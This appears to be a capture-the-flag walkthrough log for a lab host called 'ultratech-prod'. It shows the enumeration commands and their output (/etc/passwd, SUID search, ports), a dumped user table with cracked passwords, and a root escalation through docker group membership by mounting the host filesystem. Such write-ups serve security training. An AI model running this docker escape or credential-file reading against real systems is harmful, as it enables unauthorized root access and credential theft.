```
# upgrade tty

www@ultratech-prod:/$ sudo -l
[sudo] password for www: 
```

```
www@ultratech-prod:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
lp1:x:1000:1000:lp1:/home/lp1:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
r00t:x:1001:1001::/home/r00t:/bin/bash
www:x:1002:1002::/home/www:/bin/sh
```

## os
```
www@ultratech-prod:/$ uname -a
Linux ultratech-prod 4.15.0-46-generic #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

## listening ports
```
www@ultratech-prod:/$ ss -tulnp
Netid State   Recv-Q  Send-Q         Local Address:Port      Peer Address:Port                                                                                  
udp   UNCONN  0       0              127.0.0.53%lo:53             0.0.0.0:*                                                                                     
udp   UNCONN  0       0           10.10.17.49%eth0:68             0.0.0.0:*                                                                                     
tcp   LISTEN  0       80                 127.0.0.1:3306           0.0.0.0:*                                                                                     
tcp   LISTEN  0       128            127.0.0.53%lo:53             0.0.0.0:*                                                                                     
tcp   LISTEN  0       128                  0.0.0.0:22             0.0.0.0:*                                                                                     
tcp   LISTEN  0       128                        *:8081                 *:*      users:(("node",pid=1218,fd=10))                                                
tcp   LISTEN  0       32                         *:21                   *:*                                                                                     
tcp   LISTEN  0       128                     [::]:22                [::]:*                                                                                     
tcp   LISTEN  0       128                        *:31331                *:*   
```

## permissions
```
www@ultratech-prod:~/api$ find / -type f -perm -04000 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/bin/gpasswd
/bin/su
/bin/mount
/bin/ping
/bin/ntfs-3g
/bin/fusermount
/bin/umount
/snap/core/6350/bin/mount
/snap/core/6350/bin/ping
/snap/core/6350/bin/ping6
/snap/core/6350/bin/su
/snap/core/6350/bin/umount
/snap/core/6350/usr/bin/chfn
/snap/core/6350/usr/bin/chsh
/snap/core/6350/usr/bin/gpasswd
/snap/core/6350/usr/bin/newgrp
/snap/core/6350/usr/bin/passwd
/snap/core/6350/usr/bin/sudo
/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6350/usr/lib/openssh/ssh-keysign
/snap/core/6350/usr/lib/snapd/snap-confine
/snap/core/6350/usr/sbin/pppd
/snap/core/6531/bin/mount
/snap/core/6531/bin/ping
/snap/core/6531/bin/ping6
/snap/core/6531/bin/su
/snap/core/6531/bin/umount
/snap/core/6531/usr/bin/chfn
/snap/core/6531/usr/bin/chsh
/snap/core/6531/usr/bin/gpasswd
/snap/core/6531/usr/bin/newgrp
/snap/core/6531/usr/bin/passwd
/snap/core/6531/usr/bin/sudo
/snap/core/6531/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6531/usr/lib/openssh/ssh-keysign
/snap/core/6531/usr/lib/snapd/snap-confine
/snap/core/6531/usr/sbin/pppd
```

```
www@ultratech-prod:~/api$ cat /etc/crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

```
www@ultratech-prod:~/api$ ldd --version
ldd (Ubuntu GLIBC 2.27-3ubuntu1) 2.27
```

## /home/www/api/utech.db.sqlite
```
sqlite> .databases
utech.db.sqlite
sqlite> .tables
users
sqlite> select * from users;
admin|0d0ea5111e3c1def594c1684e3b9be84|0
r00t|f357a0c52799563c7c7b76c1e7543a32|0
```

# Credentials recovered
```
admin:mrsheafy
r00t:n100906
```

logged in as admin into 10.10.17.49:8081/auth
```
<html>
<h1>Restricted area</h1>
<p>Hey r00t, can you please have a look at the server's configuration?<br/>
The intern did it and I don't really trust him.<br/>
Thanks!<br/><br/>
<i>lp1</i></p>
</html>
```

logged in as r00t into 10.10.17.49:8081/auth
```
<html>
<h1>Restricted area</h1>
<p>Hey r00t, can you please have a look at the server's configuration?<br/>
The intern did it and I don't really trust him.<br/>
Thanks!<br/><br/>
<i>lp1</i></p>
</html>
```

## enum by r00t user
```
r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t: 
Sorry, user r00t may not run sudo on ultratech-prod.
```
## access to docker
```
$ r00t@ultratech-prod$ groups
r00t docker
```

## docker enum
```
r00t@ultratech-prod:~$ docker ps --all
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                     PORTS               NAMES
7beaaeecd784        bash                "docker-entrypoint.s…"   4 years ago         Exited (130) 4 years ago                       unruffled_shockley
696fb9b45ae5        bash                "docker-entrypoint.s…"   4 years ago         Exited (127) 4 years ago                       boring_varahamihira
9811859c4c5c        bash                "docker-entrypoint.s…"   4 years ago         Exited (127) 4 years ago                       boring_volhard

r00t@ultratech-prod:~$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        4 years ago         15.8MB

r00t@ultratech-prod:~$ docker volume ls
DRIVER              VOLUME NAME

r00t@ultratech-prod:~$ docker network ls
NETWORK ID          NAME                DRIVER              SCOPE
a5f6f48f884d        bridge              bridge              local
e185ba725797        host                host                local
1674086d31f4        none                null                local
```

## Exploit docker
#docker
```
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it 495d6437fc1e chroot /mnt sh
# whoami
root
```
